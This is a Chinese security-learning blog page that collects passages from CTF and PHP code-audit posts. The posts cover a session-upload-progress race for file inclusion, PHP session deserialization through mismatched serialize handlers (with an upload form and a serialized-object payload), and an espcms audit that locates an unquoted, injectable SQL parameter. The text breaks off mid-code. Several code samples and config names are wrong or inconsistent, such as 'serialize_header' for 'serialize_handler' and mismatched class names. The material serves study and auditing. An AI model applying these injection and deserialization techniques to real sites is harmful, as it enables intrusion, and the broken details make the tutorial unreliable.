<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213842165.png" alt="image-20211030213842165"></p>
<p><strong>竞争2</strong></p>
<p>在sess文件被删除之前，请求包含，获得命令相应</p>
<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213929939.png" alt="image-20211030213929939"></p>
<p>利用竞争，执行命令从而拿到fl0g.php中的flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-php代码审计学习-5" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/" class="article-date">
      <time datetime="2021-10-29T02:32:50.000Z" itemprop="datePublished">2021-10-29</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/">php代码审计学习-5</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
<h4 id="PHP-Session的工作流程"><a href="#PHP-Session的工作流程" class="headerlink" title="PHP Session的工作流程"></a>PHP Session的工作流程</h4><p>当开始一个会话时，php会尝试在请求中查找<code>SessionID</code> （通常通过会话cookie），如果发现请求的Cookies，Get、Post中并不存在<code>session id</code>时，php便会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且通过http response的set-cookie头发送给客户端进行保存。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029103800930.png" alt="image-20211029103800930"></p>
<p>当会话开始后，PHP便会将会话中的数据设置到<code>$_SESSION</code>变量中，下为在一个<code>$_SESSION</code>变量中注册变量的例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;Nayon&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当PHP脚本文件运行完成后，PHP会自动读取<code>$_SESSION</code>中的内容，并且将其序列化，然后发送给会话管理器来进行保存。</p>
<p>默认情况中，PHP来使用内置的文件会话保存管理器来完成对<code>session</code>的保存，也可以通过配置项<code>session.save_header</code>来修改要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</p>
<p>整个流程如上所属，也可参照下方流程图：</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104343511.png" alt="image-20211029104343511"></p>
<p>​    </p>
<p>php session存储默认是以文件方式进行存储，并且存储的文件是由<code>sess_sessionid</code>的格式进行存储的</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104605529.png" alt="image-20211029104605529"></p>
<p>并且其中内容为session值序列化后的内容:</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104656890.png" alt="image-20211029104656890"></p>
<p>session.serialize_header定义的引擎共有三种，如下表所示:</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><code>session.serialize_header</code>默认省略使用php处理器</p>
<p>demo1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_header&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029105204806.png" alt="image-20211029105204806"></p>
<p>序列化格式为:键名|由序列化处理后的值 : username|s:5:admin</p>
<h4 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h4><p>当<code>int_set(&#39;session_serialize_header&#39;,&#39;php_binary&#39;)</code>时页面文件使用php_binary序列化格式存储session信息</p>
<p>demo2:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029110308380.png" alt="image-20211029110308380"></p>
<p>此处键值长度为35,35对应的ASCII码为<code>#</code>，因此最终的结果便成了ascii吗将内容注释为空</p>
<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>当<code>ini_set(&#39;session.serialize_header&#39;,&#39;php_serialize&#39;)</code>时</p>
<p>demo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029111810927.png" alt="image-20211029111810927"></p>
<p>序列化后a:1表示$_session数组中存在一个元素，{}中为其参数名与值</p>
<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>利用<code>ryat</code>师傅提出的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;</span><br><span class="line">    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;</span><br><span class="line">    &lt;input type =“ file” name =“ file” /&gt;</span><br><span class="line">    &lt;input type =“ submit” /&gt;</span><br><span class="line">&lt;/ form&gt;</span><br></pre></td></tr></table></figure>

<p>提交后，<code>$_SESSION</code>中的键值就会为$_SESSION[‘upload_progress_ryat’] 在会话上传过程中，将会话数据进行序列化/反序列化，序列化格式会由<code>php.ini</code>中的<code>session.serialize_hander</code>选项设置，由此可知，若在脚本文件中设置不同的serialize_handler，那么可以导致注入任意<code>session</code>数据。</p>
<p>上面的解释可能看起来有些绕，简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
<p>其威海店在于<code>session.serialize_handler=php_serialize</code>存储的字符可以引入| ,但当以<code>session.serialize_handler=php</code>格式取出<code>$_session</code>值时,<code>|</code>会被当做键值对的分隔符，造成键、值数目错误，会在特定的地方造成反序列化漏洞</p>
<p>demo：</p>
<p>利用session.php文件，用于传入session值，文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其session内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>其另一个class.php文件如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Class1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此处运行实例化后，输出test</p>
<p><code>session.php</code> 文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的session值，class.php文件的作用是在对象unserialize()之前进行调用输出<code>who are you</code>，反序列化结束后，输出name值</p>
<p>这两个文件想要利用反序列化session漏洞，我们需要在session.php文件传入<code>|</code>与<code>序列化格式的值</code>，然后再次访问class.php时，就会调用session值，以php处理器的格式取出session，从而引发反序列化漏洞。</p>
<p>首先生成序列化字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//触发反序列化时，调用__wakeup()打印输出字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;who are you&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对象运行完成，打印name值</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建实例str</span></span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> Class2();</span><br><span class="line"><span class="comment">//对实例name赋值</span></span><br><span class="line"><span class="variable">$str</span>-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="comment">//序列化对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>拿到payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Class1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029123051359.png" alt="image-20211029123051359"></p>
<p>将其传入index.php</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-php代码审计学习-4" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/" class="article-date">
      <time datetime="2021-10-26T06:45:24.000Z" itemprop="datePublished">2021-10-26</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/">php代码审计学习-4</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>​    </p>
<h3 id="espcms-审计"><a href="#espcms-审计" class="headerlink" title="espcms 审计"></a>espcms 审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">资源下载:http:<span class="comment">//down.chinaz.com/soft/27695.htm</span></span><br></pre></td></tr></table></figure>

<p>解压安装后，利用esay审计系统进行自动化审计，筛选可疑语句。</p>
<p>看到一处普通的sql查询语句，右键跟进打开文件</p>
<p>可以看到，SQL查询在一个类的自定义函数<code>oncitylist</code>之内</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  PHP version 5</span></span><br><span class="line"><span class="comment">  Copyright (c) 2002-2010 ECISP.CN</span></span><br><span class="line"><span class="comment">  声明：这不是一个免费的软件，请在许可范围内使用</span></span><br><span class="line"><span class="comment">  作者：Bili E-mail:huangqyun@163.com  QQ:6326420</span></span><br><span class="line"><span class="comment">  http://www.ecisp.cn	http://www.easysitepm.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span> <span class="keyword">extends</span> <span class="title">connector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">important</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;softbase(<span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">oncitylist</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$parentid</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;parentid&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line">		<span class="variable">$parentid</span> = <span class="keyword">empty</span>(<span class="variable">$parentid</span>) ? <span class="number">1</span> : <span class="variable">$parentid</span>;</span><br><span class="line">		<span class="variable">$verid</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;verid&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line">		<span class="variable">$verid</span> = <span class="keyword">empty</span>(<span class="variable">$verid</span>) ? <span class="number">0</span> : <span class="variable">$verid</span>;</span><br><span class="line">		<span class="variable">$db_table</span> = db_prefix . <span class="string">&#x27;city&#x27;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select * from <span class="subst">$db_table</span> where parentid=<span class="subst">$parentid</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$rsList</span> = <span class="keyword">$this</span>-&gt;db-&gt;fetch_array(<span class="variable">$rs</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$verid</span> == <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>]) &#123;</span><br><span class="line">				<span class="variable">$list</span>.=<span class="string">&#x27;&lt;option selected value=&quot;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;cityname&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable">$list</span>.=<span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$rsList</span>[<span class="string">&#x27;cityname&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="variable">$list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中sql语句中有两个变量，<code>$db_table </code> 这个变量尚未发现可修改点，<code>$parentid</code> 由accept函数进行处理，右键定位函数查看实现。</p>
<p>选项id2的accept函数，id1为安装cms时所用。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026150513549.png" alt="image-20211026150513549"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">accept</span>(<span class="params"><span class="variable">$k</span>, <span class="variable">$var</span>=<span class="string">&#x27;R&#x27;</span>, <span class="variable">$htmlcode</span>=<span class="literal">true</span>, <span class="variable">$rehtml</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$var</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">			<span class="variable">$var</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$var</span>[<span class="variable">$k</span>])) &#123;</span><br><span class="line">				<span class="variable">$var</span> = &amp;<span class="variable">$_POST</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$putvalue</span> = <span class="keyword">isset</span>(<span class="variable">$var</span>[<span class="variable">$k</span>]) ? <span class="keyword">$this</span>-&gt;daddslashes(<span class="variable">$var</span>[<span class="variable">$k</span>], <span class="number">0</span>) : <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$htmlcode</span> ? (<span class="variable">$rehtml</span> ? <span class="keyword">$this</span>-&gt;preg_htmldecode(<span class="variable">$putvalue</span>) : <span class="keyword">$this</span>-&gt;htmldecode(<span class="variable">$putvalue</span>)) : <span class="variable">$putvalue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码可知，accept()接受的第二个参数决定<code>parentid</code>是否可以接受$_GET 或 $_POST的值。</p>
<p><code>accept(&#39;verid&#39;, &#39;R&#39;);</code> 可知第二个参数为R，R变量也就在accept中获得了$_GET的内存地址，也就是说R变量相当于$_GET，若$R[‘verid’] $_GET方式获得的值为空的话，则去POST请求处取值。</p>
<p>也就是说当accept第二个参数为R时，accept的第一个参数<code>verid</code>可以接受POST或GET请求的值。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152610244.png" alt="image-20211026152610244"></p>
<p>随后参数经过daddslashes的处理，右键跟进可知，此处递归处理字符串，避免双引号，反斜线的出现造成sql注入等问题；但我们刚才拿到的citylist.php处为无符号sql，查询引号问题也可用16进制避免，因此此处防护无效。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152638025.png" alt="image-20211026152638025"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$force</span>=<span class="number">0</span>, <span class="variable">$strip</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!get_magic_quotes_gpc() || <span class="variable">$force</span> == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (is_array(<span class="variable">$string</span>)) &#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">					<span class="variable">$string</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$strip</span> ? stripslashes(<span class="variable">$val</span>) : <span class="variable">$val</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable">$string</span> = addslashes(<span class="variable">$strip</span> ? stripslashes(<span class="variable">$string</span>) : <span class="variable">$string</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后经过html编码处理，return回到citylist.php，<strong>此时，若是将类实例化，我们便可以通过POST或GET方式对parentid进行传参。</strong></p>
<p>查询类<strong>important</strong> ，可以看到其在index.php内进行实例化操作，跟进审计。</p>
<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4.assets/image-20211026152938912.png" alt="image-20211026152938912"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$point</span> = indexget(<span class="string">&#x27;point&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line"><span class="variable">$point</span> = <span class="keyword">empty</span>(<span class="variable">$point</span>) ? <span class="string">&#x27;admin&#x27;</span> : <span class="variable">$point</span>;</span><br><span class="line"><span class="variable">$archive</span> = indexget(<span class="string">&#x27;archive&#x27;</span>, <span 